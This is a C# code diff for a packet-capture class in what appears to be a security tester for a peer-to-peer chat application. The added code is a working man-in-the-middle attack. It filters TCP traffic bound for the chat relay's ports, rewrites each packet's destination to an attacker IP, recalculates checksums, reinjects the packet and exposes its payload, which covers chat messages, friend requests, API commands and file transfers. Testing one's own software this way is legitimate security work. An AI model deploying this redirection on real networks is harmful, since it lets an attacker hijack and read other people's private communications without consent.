@@ -19,19 +19,39 @@ namespace ChatP2P.SecurityTester.Network
     {
         private bool _isCapturing = false;
         private ICaptureDevice? _captureDevice;
+        private IInjectionDevice? _injectionDevice;
         private int _packetCount = 0;
+        private string? _relayServerIP;
+        private string? _attackerIP;
+        private Dictionary<int, int> _portMappings;
 
         public event Action<CapturedPacket>? PacketCaptured;
         public event Action<string>? LogMessage;
+        public event Action<string, int, byte[]>? TCPPacketIntercepted;
 
-        public async Task<bool> StartCapture(string interfaceName = "")
+        public PacketCapture()
+        {
+            _portMappings = new Dictionary<int, int>
+            {
+                { 7777, 35777 }, // Friend Requests
+                { 8888, 35888 }, // Chat Messages
+                { 8889, 35889 }, // API Commands
+                { 8891, 35891 }  // File Transfers
+            };
+        }
+
+        public async Task<bool> StartCapture(string interfaceName = "", string relayServerIP = "", string attackerIP = "")
         {
             try
             {
-                LogMessage?.Invoke($"🕷️ DÉMARRAGE CAPTURE TRAFIC VICTIME");
+                _relayServerIP = relayServerIP;
+                _attackerIP = attackerIP;
+
+                LogMessage?.Invoke($"🕷️ DÉMARRAGE CAPTURE TRAFIC VICTIME AVEC REDIRECTION");
                 LogMessage?.Invoke($"📡 Interface demandée: {interfaceName}");
-                LogMessage?.Invoke($"🎯 Target: {SecurityTesterConfig.TargetClientIP}");
-                LogMessage?.Invoke($"⚠️ ATTENTION: Capture RÉELLE du trafic réseau");
+                LogMessage?.Invoke($"🎯 Relay target: {relayServerIP}");
+                LogMessage?.Invoke($"🕷️ Attacker IP: {attackerIP}");
+                LogMessage?.Invoke($"⚠️ ATTENTION: Capture RÉELLE + REDIRECTION du trafic réseau");
 
                 // Obtenir toutes les interfaces réseau
                 var devices = CaptureDeviceList.Instance;
@@ -61,6 +81,13 @@ namespace ChatP2P.SecurityTester.Network
                     return false;
                 }
 
+                // Setup injection device pour packet injection
+                _injectionDevice = _captureDevice as IInjectionDevice;
+                if (_injectionDevice == null)
+                {
+                    LogMessage?.Invoke("⚠️ Interface ne supporte pas l'injection de packets - redirection limitée");
+                }
+
                 LogMessage?.Invoke($"✅ Interface sélectionnée: {_captureDevice.Description}");
                 LogMessage?.Invoke($"📍 Interface Name: {_captureDevice.Name}");
 
@@ -81,14 +108,17 @@ namespace ChatP2P.SecurityTester.Network
                     LogMessage?.Invoke("✅ Mode par défaut activé");
                 }
 
-                // FILTRE PLUS LARGE pour capturer plus de trafic
-                // Suppression du filtre restrictif pour voir tout d'abord
-                LogMessage?.Invoke("🔍 Application filtre large pour diagnostic...");
-
-                // Pas de filtre au début pour voir si on capture quelque chose
-                // _captureDevice.Filter = "";  // Commenté pour tester sans filtre
-
-                LogMessage?.Invoke("📡 AUCUN FILTRE - Capture tout le trafic pour diagnostic");
+                // 🚨 FILTRE SPÉCIFIQUE pour redirection TCP vers relay
+                if (!string.IsNullOrEmpty(relayServerIP))
+                {
+                    var filter = $"tcp and dst host {relayServerIP} and (dst port 7777 or dst port 8888 or dst port 8889 or dst port 8891)";
+                    _captureDevice.Filter = filter;
+                    LogMessage?.Invoke($"🎯 FILTRE REDIRECTION TCP: {filter}");
+                }
+                else
+                {
+                    LogMessage?.Invoke("📡 FILTRE LARGE - Capture pour diagnostic");
+                }
 
                 _isCapturing = true;
                 _packetCount = 0;
@@ -111,7 +141,7 @@ namespace ChatP2P.SecurityTester.Network
         }
 
         /// <summary>
-        /// 🕷️ HANDLER PRINCIPAL - Traite chaque packet intercepté et l'envoie au GridView
+        /// 🕷️ HANDLER PRINCIPAL - Intercepte et REDIRIGE les packets TCP vers relay
         /// </summary>
         private void OnPacketArrival(object sender, SharpPcap.PacketCapture e)
         {
@@ -135,6 +165,13 @@ namespace ChatP2P.SecurityTester.Network
 
                 var rawPacket = e.GetPacket();
                 var packet = Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);
+
+                // 🚨 NOUVEAU: INTERCEPTION + REDIRECTION TCP RÉELLE
+                if (InterceptAndRedirectTCP(packet, rawPacket))
+                {
+                    LogMessage?.Invoke($"🎯 PACKET INTERCEPTÉ ET REDIRIGÉ #{_packetCount}");
+                    return; // Ne pas traiter normalement si intercepté
+                }
 
                 var capturedPacket = AnalyzePacket(packet, rawPacket.Timeval.Date);
 
@@ -371,6 +408,8 @@ namespace ChatP2P.SecurityTester.Network
                     _captureDevice = null;
                 }
 
+                _injectionDevice = null;
+
                 LogMessage?.Invoke($"⏹️ CAPTURE ARRÊTÉE - {_packetCount} packets interceptés");
                 LogMessage?.Invoke("📊 Analyse du trafic victime terminée");
             }
@@ -412,6 +451,106 @@ namespace ChatP2P.SecurityTester.Network
             {
                 LogMessage?.Invoke($"❌ Erreur enumération interfaces: {ex.Message}");
                 return new List<string> { "Default Interface" };
+            }
+        }
+
+        /// <summary>
+        /// 🚨 INTERCEPTION ET REDIRECTION TCP RÉELLE - Le coeur du MITM avec packet injection
+        /// </summary>
+        private bool InterceptAndRedirectTCP(Packet packet, SharpPcap.RawCapture rawPacket)
+        {
+            try
+            {
+                if (_relayServerIP == null || _attackerIP == null || _injectionDevice == null) return false;
+
+                var ethernetPacket = packet.Extract<EthernetPacket>();
+                if (ethernetPacket == null) return false;
+
+                var ipPacket = ethernetPacket.Extract<IPPacket>();
+                if (ipPacket == null) return false;
+
+                var tcpPacket = ipPacket.Extract<TcpPacket>();
+                if (tcpPacket == null) return false;
+
+                string destIP = ipPacket.DestinationAddress.ToString();
+                int destPort = tcpPacket.DestinationPort;
+
+                // 🎯 DÉTECTER: Connexion vers relay ChatP2P ?
+                if (destIP == _relayServerIP && _portMappings.ContainsKey(destPort))
+                {
+                    LogMessage?.Invoke($"🚨 INTERCEPTION: {ipPacket.SourceAddress}:{tcpPacket.SourcePort} → {destIP}:{destPort}");
+
+                    // 🔄 REDIRIGER vers proxy local - MODIFICATION DU PACKET
+                    int localProxyPort = _portMappings[destPort];
+
+                    // 🚨 NOUVELLE ARCHITECTURE: Rediriger vers IP attaquant avec port original
+                    ipPacket.DestinationAddress = IPAddress.Parse(_attackerIP);
+
+                    // Garder le port original (plus de mapping ports)
+                    // tcpPacket.DestinationPort reste inchangé (port original)
+
+                    // 🚨 CRITIQUE: Recalculer les checksums après modification
+                    tcpPacket.UpdateTcpChecksum();
+                    ipPacket.UpdateCalculatedValues();
+
+                    LogMessage?.Invoke($"🎯 PACKET MODIFIÉ: {destIP}:{destPort} → {_attackerIP}:{destPort}");
+
+                    // 🚀 RÉINJECTER le packet modifié sur l'interface
+                    try
+                    {
+                        // Utiliser les bytes du packet modifié (ethernetPacket contient les modifications)
+                        _injectionDevice.SendPacket(ethernetPacket.Bytes);
+                        LogMessage?.Invoke($"✅ PACKET RÉINJECTÉ avec succès");
+
+                        // Notifier l'interception pour logging
+                        TCPPacketIntercepted?.Invoke(ipPacket.SourceAddress.ToString(), destPort, tcpPacket.PayloadData ?? new byte[0]);
+
+                        return true; // Packet intercepté et redirigé
+                    }
+                    catch (Exception sendEx)
+                    {
+                        LogMessage?.Invoke($"❌ Erreur réinjection packet: {sendEx.Message}");
+                        return false;
+                    }
+                }
+
+                return false; // Packet non intercepté
+            }
+            catch (Exception ex)
+            {
+                LogMessage?.Invoke($"❌ Erreur interception/redirection TCP: {ex.Message}");
+                return false;
+            }
+        }
+
+        /// <summary>
+        /// 🔧 Configure les paramètres d'interception
+        /// </summary>
+        public void ConfigureInterception(string relayServerIP, string attackerIP)
+        {
+            _relayServerIP = relayServerIP;
+            _attackerIP = attackerIP;
+            LogMessage?.Invoke($"🔧 Interception configurée: {relayServerIP} → {attackerIP}");
+        }
+
+        /// <summary>
+        /// 📡 Active le filtre pour capturer seulement le trafic vers relay
+        /// </summary>
+        public void EnableTCPInterceptionFilter()
+        {
+            try
+            {
+                if (_captureDevice != null && _relayServerIP != null)
+                {
+                    // Filtre pour capturer seulement TCP vers relay
+                    var filter = $"tcp and dst host {_relayServerIP} and (dst port 7777 or dst port 8888 or dst port 8889 or dst port 8891)";
+                    _captureDevice.Filter = filter;
+                    LogMessage?.Invoke($"🔍 Filtre TCP actif: {filter}");
+                }
+            }
+            catch (Exception ex)
+            {
+                LogMessage?.Invoke($"❌ Erreur configuration filtre: {ex.Message}");
             }
         }
 
